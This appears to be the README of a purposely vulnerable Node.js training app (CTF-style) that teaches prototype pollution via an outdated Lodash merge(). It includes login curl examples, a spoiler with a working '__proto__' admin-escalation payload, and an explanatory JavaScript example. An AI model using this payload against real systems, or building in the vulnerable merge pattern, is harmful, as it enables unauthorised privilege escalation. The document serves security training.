# Pollute API - A Prototype Pollution Example

Pollute API is a purposely vulnerable Node.js application for understanding prototype pollution vulnerabilities. Its meant to be a CTF or training exercise for hackers. I wrote this to further my understanding about Prototype Pollution vulnerabilities at the time.

This code is based on examples from other Prototype Pollution vulnerabilities.

This app uses an outdated version of Lodash, which contains a prototype pollution vulnerability when
using the `merge()` function. 

The initial report is here: https://hackerone.com/reports/380873

### Using Pollute API

Pollute API has two main endpoints. The objective is to gain admin access. Three users exist:

* dolores / pollute
* hector / pollute
* bernard / <unknown password> (has admin privs)

You need to exploit a prototype pollution vulnerability to gain admin privileges. 

### Endpoints
Using curl:
```
$ curl localhost:8000/api/login -H "Content-Type: application/json" -d '{"username" : "dolores", "password": "pollute", "redirect_url": "/api/get_detailed_stats"}' -X POST

{"message":"Logged in as: dolores, from ::ffff:127.0.0.1"}
```

Or the raw request (using Burp Suite or similar):
```
POST /api/login HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 70

{
    "username": "dolores", 
    "password": "pollute",
    "redirect_url":"/api"
}
```

Expected response:
```
HTTP/1.1 200 OK
...

{"message":"Logged in as: dolores, from ::ffff:127.0.0.1"}
```

### Exploit

Note that if you successfully exploit this vulnerability, it will be persistent until the server has restarted, since you're polluting the object.

<details>
    <summary>Spoiler warning</summary>

    POST /api/login HTTP/1.1
    Host: localhost
    Content-Type: application/json
    Content-Length: 93

    {
        "username": "dolores", 
        "password": "pollute",
        "redirect_url": {"__proto__":{"admin":true}}
    }

Expected response:

    HTTP/1.1 200 OK
    ...

    {"message":"Logged in as: dolores, with admin privileges, from ::ffff:127.0.0.1"}

</details>

### Running in Docker
* Using Docker Compose: `docker-compose up`

Test connection:
```
$ curl localhost:8181/api/

{"message":"login at /api/login"}
```

### Deploying to ECS
I've also included Terraform code to deploy an instance to AWS ECS, in the `terraform` directory.


## What is Prototype Pollution
Prototype pollution vulnerabilities occur when its possible to control an object's prototype property.

The prototype property can be accessed and modified as shown below (where `person` is an example object):
```
function person(name, age) { ... }

...

person.prototype //prints the prototype property 
person1.constructor.prototype //points to person.prototype
person1.__proto__ //__proto__ points to person.prototype
```

### Prototype Pollution
This is a basic example of what Prototype Pollution is, and how it works.

Consider the following js code:
```
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
}

var person1 = new person("Satoshi", 70);
var person2 = new person("Buterin", 26);

// here we add a new 'details' functions to the person1 object by modifying the prototype
person1.constructor.prototype.details = function() {
    return this.fullName + " has age: " + this.age;
}

// then we call this new function, and it works as expected
console.log(person1.details()); // prints "Satoshi has age: 70"

// and then we call this on person2, which never had the new object
console.log(person2.details()); // prints "Buterin has age: 26"

// however, it still works. Why? Because constructor.prototype is referring to the prototype of 'person'
```

### Further Reading
* https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7
* https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/